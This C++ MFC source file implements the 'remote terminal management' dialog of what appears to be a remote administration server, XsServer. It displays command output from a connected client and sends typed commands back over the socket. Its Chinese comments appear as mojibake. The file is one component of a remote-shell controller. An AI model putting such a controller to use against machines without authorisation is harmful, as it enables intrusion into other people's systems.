// DlgCmdManager.cpp : ʵ���ļ�
//

#include "stdafx.h"
#include "XsServer.h"
#include "DlgCmdManager.h"
#include "afxdialogex.h"


// CDlgCmdManager �Ի���

IMPLEMENT_DYNAMIC(CDlgCmdManager, CDialog)

CDlgCmdManager::CDlgCmdManager(CWnd* pParent,
	_CIOCPServer* IOCPServer, PCONTEXT_OBJECT ContextObject)
	: CDialog(IDD_DIALOG_CMD_MANAGER, pParent)
{
	m_IOCPServer = IOCPServer;
	m_ContextObject = ContextObject;
	

	m_IconHwnd = LoadIcon(AfxGetInstanceHandle(), MAKEINTRESOURCE(IDR_MAINFRAME));
}

CDlgCmdManager::~CDlgCmdManager()
{
}

void CDlgCmdManager::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_EDIT_DIALOG_CMD_MANAGER_MAIN, m_CEdit_Dialog_Cmd_Manager_Main);
}


BEGIN_MESSAGE_MAP(CDlgCmdManager, CDialog)
	ON_WM_CLOSE()
	ON_WM_CTLCOLOR()
END_MESSAGE_MAP()


// CDlgCmdManager ��Ϣ�������


BOOL CDlgCmdManager::OnInitDialog()
{
	CDialog::OnInitDialog();

	SetIcon(m_IconHwnd, FALSE);
	//��ÿͻ���IP��ַ
	CString v1;
	sockaddr_in ClientAddress;
	memset(&ClientAddress, 0, sizeof(ClientAddress));
	int ClientAddressLength = sizeof(ClientAddress);
	BOOL IsOk = getpeername(m_ContextObject->ClientSocket, (SOCKADDR*)&ClientAddress, &ClientAddressLength);  //�õ�����IP
	v1.Format("\\\\%s - Զ���ն˹���", IsOk != INVALID_SOCKET ? inet_ntoa(ClientAddress.sin_addr) : "");
	//���öԻ������
	SetWindowText(v1);

	BYTE IsToken = CLIENT_GO_ON;
	m_IOCPServer->OnPrepareSending(m_ContextObject, &IsToken, sizeof(BYTE));


	return TRUE;  // return TRUE unless you set the focus to a control
				  // �쳣: OCX ����ҳӦ���� FALSE
}


void CDlgCmdManager::OnClose()
{
	if (m_ContextObject != NULL)
	{
		m_ContextObject->DialogID = 0;
	    m_ContextObject->DialogHandle = NULL;
	    CancelIo((HANDLE)m_ContextObject->ClientSocket);
	    closesocket(m_ContextObject->ClientSocket);
	}
	
	CDialog::OnClose();
}
void CDlgCmdManager::WindowHandleIO(void)
{
	if (m_ContextObject == NULL)
	{
		return;
	}
	ShowCmdData();
	m_ShowDataLength = m_CEdit_Dialog_Cmd_Manager_Main.GetWindowTextLength();
}
VOID CDlgCmdManager::ShowCmdData(void)
{
	//�ӱ��ض��������ݼ���һ�� \0
	m_ContextObject->m_ReceivedDecompressedBufferData.WriteArray((LPBYTE)"", 1);
	//����������� ����\0
	CString v1 = (char*)m_ContextObject->m_ReceivedDecompressedBufferData.GetArray(0);
	//�滻��ԭ���Ļ��з�
	v1.Replace("\n", "\r\n");
	//�õ���ǰ�����ַ�����
	int BufferLength =  m_CEdit_Dialog_Cmd_Manager_Main.GetWindowTextLength();
	//����궨λ����λ�ò�ѡ��ָ���������ַ� ��ĩβ ���ӱ��ض˴�����������ʾ��������ǰ���ݵĺ���
	m_CEdit_Dialog_Cmd_Manager_Main.SetSel(BufferLength, BufferLength);

	//�ô��ݹ����������滻����λ�õ��ַ�   //��ʾ
	m_CEdit_Dialog_Cmd_Manager_Main.ReplaceSel(v1);
	//���»���ַ���С
	m_911 = m_CEdit_Dialog_Cmd_Manager_Main.GetWindowTextLengthA();

}

BOOL CDlgCmdManager::PreTranslateMessage(MSG* pMsg)
{
	if (pMsg->message == WM_KEYDOWN)
	{
		//����VK_ESCAPE��VK_DELETE
		if (pMsg->wParam == VK_ESCAPE || pMsg->wParam == VK_DELETE)
		{
			return true;
		}
		//����ǿɱ༭�Ļس���
		if (pMsg->wParam == VK_RETURN && pMsg->hwnd == m_CEdit_Dialog_Cmd_Manager_Main.m_hWnd)
		{
			//�õ��������ݴ�С
			int BufferLength = m_CEdit_Dialog_Cmd_Manager_Main.GetWindowTextLength();
			CString BufferData;
			//�õ����ڵ��ַ�����
			m_CEdit_Dialog_Cmd_Manager_Main.GetWindowText(BufferData);
			//���뻻�з�
			BufferData += "\r\n";

			//��������
			m_IOCPServer->OnPrepareSending(m_ContextObject, (LPBYTE)BufferData.GetBuffer(0) + m_911,
				BufferData.GetLength() - m_911);
			//���¶�λm_911
			m_911 = m_CEdit_Dialog_Cmd_Manager_Main.GetWindowTextLength();

		}
		//����VK_BACK
		if (pMsg->wParam == VK_BACK && pMsg->hwnd == m_CEdit_Dialog_Cmd_Manager_Main.m_hWnd)
		{
			if (m_CEdit_Dialog_Cmd_Manager_Main.GetWindowTextLength() <= m_ShowDataLength)
			{
				return true;
			}
		}
	}
	return CDialog::PreTranslateMessage(pMsg);
}


HBRUSH CDlgCmdManager::OnCtlColor(CDC* pDC, CWnd* pWnd, UINT nCtlColor)
{
	HBRUSH hbr = CDialog::OnCtlColor(pDC, pWnd, nCtlColor);

	if ((pWnd->GetDlgCtrlID() == IDC_EDIT_DIALOG_CMD_MANAGER_MAIN) && (nCtlColor == CTLCOLOR_EDIT))
	{
		COLORREF ColorReference = RGB(255, 255, 255);
		pDC->SetTextColor(ColorReference);  //��ɫ�ı�
		ColorReference = RGB(0, 0, 0);
		pDC->SetBkColor(ColorReference);    //��ɫ����
		return CreateSolidBrush(ColorReference);
	}
	else
	{
		return CDialog::OnCtlColor(pDC, pWnd, nCtlColor);
	}

	return hbr;
}
